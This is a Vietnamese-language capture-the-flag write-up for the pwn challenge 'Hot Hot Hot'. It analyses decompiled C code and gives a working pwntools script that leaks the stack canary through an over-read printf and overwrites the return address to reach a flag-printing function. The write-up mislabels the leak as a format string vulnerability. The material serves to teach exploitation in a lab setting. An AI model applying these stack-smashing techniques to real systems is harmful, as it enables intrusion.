# VSL Summer CTF

<img src="https://github.com/Thuanle2401/VSL-CTF/blob/main/web/UploadFile1/images/VSL-summer.png?raw=true" width="500" height="300">

---
# Challenge: Hot Hot Hot
---
## 1. Thông tin người thực hiện
- Họ và tên: Lê Ngọc Thuận

## 2. Thông tin challenge
- [Link Download](https://vsl.ce.vku.udn.vn/files/2d87b37396ac71cc4964bae41d468c0e/challenge.zip?token=eyJ1c2VyX2lkIjoyMDgsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjQzfQ.aFbGkg.m4P5jFzT8OVy1Gro70FTYouoNMA)
- Netcat connection: `nc 61.14.233.78 7001`

## 3. Solution
- Công cụ: **IDA free 9.0, checksec, pwndbg, pwntools (python3)**

### 3.1. Phân tích file nhị phân(hothothot) được dịch ngược bằng IDA
- Ở tab `function name` trong **IDA** ta thấy có 1 số hàm đáng chú ý là `main`, `duckling`, `duck_attack`: 
- Hàm `main`:
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  duckling(argc, argv, envp);
  return 0;
}
```
- Ta có thể thấy `main` lại gọi tiếp 1 hàm là `duckling`, ta sẽ tiếp tục phân tích hàm này:
```c
unsigned __int64 duckling()
{
  char *v1; // [rsp+8h] [rbp-88h]
  _QWORD buf[4]; // [rsp+10h] [rbp-80h] BYREF
  _QWORD v3[11]; // [rsp+30h] [rbp-60h] BYREF
  unsigned __int64 v4; // [rsp+88h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  memset(v3, 0, 80);
  printf("Quack the Duck!\n\n> ");
  fflush(_bss_start);
  read(0, buf, 0x66uLL);
  v1 = strstr((const char *)buf, "Quack Quack ");
  if ( !v1 )
  {
    error("Where are your Quack Manners?!\n");
    exit(1312);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
  read(0, v3, 0x6AuLL);
  puts("Did you really expect to win a fight against a Duck?!\n");
  return v4 - __readfsqword(0x28u);
}
```
- Quan sát mảng `buf` và `v3` mà chương trình cấp phát và kích thước dữ liệu mà người dùng có thể nhập vào 2 mảng này thông qua hàm `read` ta có thể kết luận chương trình mắc lỗi `buffer overflow` và quan sát code trong hàm `duck_attack`(cho phép đọc file `flag.txt`), có vẻ như mục tiêu của ta là thao túng thanh ghi `rip` trỏ đến hàm `duck_attack` nhờ vào `buffer overflow`.
- Tuy nhiên, chương trình đã bật `Stack Canary` để ngăn việc tràn bộ đệm, ta sẽ dùng `checksec` để kiểm tra điều này:

```bash
$ checksec --file=hothothot
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   RW-RUNPATH   54 Symbols        No    0               2               hothothot
```
- Vậy liệu ta có thể bypass được `Stack Canary` để tiếp tục thực hiện được `buffer overflow` không? 
- Tiếp tục quan sát hàm `duckling` có đoạn:
```c
printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
```
- Đoạn này sẽ in nội dung từ địa chỉ `v1 + 32` trở đi với định dạng `%s` và ta hoàn toàn có thể tận dụng điều này để chương trình leak nội dung của `Stack Canary`
(`Format String Vulnerability`)

### 3.2. Tìm offset đến `Stack Canary` trong `duckling`
3.2. Tìm offset đến Stack Canary trong duckling
- Qua phân tích từ **IDA**, ta thấy `layout stack` như sau:
```less
[buf: 0x80 bytes]  --> user input đầu tiên (read 0x66 = 102 bytes)
[v3: 0x60 bytes]   --> user input thứ hai (read 0x6A = 106 bytes)
[v4: canary]
[saved RBP]
[RIP]
```
- Ta nhận thấy `buf` và `v3` được đặt kế tiếp nhau trên stack, trong đó `v3` có kích thước đúng 88 bytes, tiếp theo là canary (8 bytes) → tổng cộng offset 88 là nơi canary bắt đầu trong vùng `v3`. Vậy nếu nhập từ `buf` thì offset đến `canary` sẽ là 120 bytes (32 + 88 bytes) nhưng ta sẽ sẽ không thể nhập quá 102 bytes vì
user input đầu tiên (read 0x66 = 102 bytes).

### 3.3. Leak `Stack Canary`
- Hàm `strstr` trong `duckling` tìm chuỗi `"Quack Quack "` trong dữ liệu ta nhập vào `buf`, rồi in nội dung từ `v1 + 32` trở đi với định dạng `%s`.
- Nhờ đó, ta có thể điều chỉnh input sao cho `"Quack Quack "` bắt đầu ở vị trí thứ 89 trong user input đầu tiên, rồi `v1 + 32` sẽ nằm tại vị trí `stack canary` và thêm 1 byte nữa để tránh đọc `null byte` (`\x00`) (byte đầu của `canary` là `\x00`) như vậy ta có thể leak được 7 bytes sau của canary.
- Sau đó, ta ghép 7 bytes `canary` vừa leak được bằng cách thêm byte `\x00` vào đầu khi dùng `u64` (`pwntools`)

### 3.4. Script Python
- Dưới đây là script khai thác và giải thích chi tiết:

```python
from pwn import *

p = remote('61.14.233.78', 7001)

# Payload đầu tiên để bypass strstr()
# Gửi 89 bytes để chiếm đầy `buf` + 1 byte đè lên byte đầu tiên của stack canary (thường là \x00)
# Sau đó là chuỗi "Quack Quack " để hàm `strstr(buf, "Quack Quack ")` tìm thấy chuỗi này tại offset 89
first = b'A'*89 + b"Quack Quack "
p.send(first)

# Chờ chương trình in ra prompt `"ready to fight the Duck?\n\n> "` 
output = p.recvuntil(b"ready to fight the Duck?\n\n> ")

# Parse nội dung được in giữa "Quack Quack " và ", ready"
# Đây chính là nơi `printf("%s", v1+32)` in ra từ stack → có thể bắt đầu từ phần còn lại của canary
leak = output.split(b"Quack Quack ")[2].split(b", ready")[0]

# Vì byte đầu tiên của canary bị ghi đè bởi 'A' nên không leak được,
# ta prepends thủ công `\x00` để khôi phục lại giá trị gốc (vì canary luôn có byte đầu là 0)
canary = u64(b'\x00' + leak[:7])
log.info(f"Canary: {hex(canary)}")

# Payload thứ hai: ghi đè buf, canary, saved RBP, và RIP để nhảy tới duck_attack()
second = flat(
    b'B' * 88,           # Ghi đè hết vùng buffer
    p64(canary),         # Ghi đúng lại stack canary đã leak được
    b'C' * 8,            # Ghi đè saved RBP (không quan trọng)
    p64(0x40137f),       # Ghi đè RIP → nhảy tới địa chỉ hàm duck_attack()
)

# Gửi payload ROP
p.send(second)
p.interactive()
```

- Sau khi chạy script, ta nhận được flag: <br>
`VSL{h0t_h0tt3r_h0tt3st_fl4m3_292jdnk@&wmql}`






